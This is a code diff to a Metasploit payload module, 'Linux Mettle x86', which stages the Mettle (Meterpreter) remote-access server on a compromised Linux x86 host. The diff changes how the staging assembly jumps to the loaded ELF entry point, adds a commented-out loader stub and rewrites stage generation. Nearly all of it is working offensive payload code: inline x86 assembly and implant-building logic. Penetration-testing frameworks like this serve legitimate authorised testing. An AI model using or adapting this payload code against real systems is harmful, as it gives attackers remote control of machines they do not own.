@@ -6,34 +6,27 @@
 require 'rex/elfparsey'
 
 module MetasploitModule
-  include Msf::Sessions::MeterpreterOptions
+  include Msf::Sessions::MeterpreterOptions::Linux
   include Msf::Sessions::MettleConfig
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name'        => 'Linux Mettle x86',
+        'Name' => 'Linux Mettle x86',
         'Description' => 'Inject the mettle server payload (staged)',
-        'Author'      => [
+        'Author' => [
           'William Webb <william_webb[at]rapid7.com>'
         ],
-        'Platform'    => 'Linux',
-        'Arch'        => ARCH_X86,
-        'License'     => MSF_LICENSE,
-        'Session'     => Msf::Sessions::Meterpreter_x86_Linux
+        'Platform' => 'Linux',
+        'Arch' => ARCH_X86,
+        'License' => MSF_LICENSE,
+        'Session' => Msf::Sessions::Meterpreter_x86_Linux
       )
     )
   end
 
-  def elf_ep(payload)
-    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
-    elf.elf_header.e_entry
-  end
-
   def asm_intermediate_stage(payload)
-    entry_offset = elf_ep(payload)
-
     %(
       push edi                    ; save sockfd
       xor ebx, ebx                ; address
@@ -76,10 +69,7 @@ module MetasploitModule
       push esi                    ; m
       mov eax, 2
       push eax                    ; argc
-
-      ; down the rabbit hole
-      mov eax, #{entry_offset}
-      add edx, eax
+      add edx, [edx + 0x18]
       jmp edx
     )
   end
@@ -95,8 +85,19 @@ module MetasploitModule
   end
 
   def generate_stage(opts = {})
+    # elf_loader_asm = %(
+    #   elf_loader:
+    #     jmp bottom
+    #   got_bottom:
+    #     pop edx
+    #     add edx, [edx + 0x18]
+    #     jmp edx
+    #   bottom:
+    #     call got_bottom
+    # )
+    # elf_loader = Metasm::Shellcode.assemble(Metasm::X86.new, elf_loader_asm).encode_string
     config_opts = {scheme: 'tcp'}.merge(mettle_logging_config(opts))
-    MetasploitPayloads::Mettle.new('i486-linux-musl',
-      generate_config(opts.merge(config_opts))).to_binary :process_image
+    binary = MetasploitPayloads::Mettle.new('i486-linux-musl', generate_config(opts.merge(config_opts))).to_binary :process_image
+    binary
   end
 end
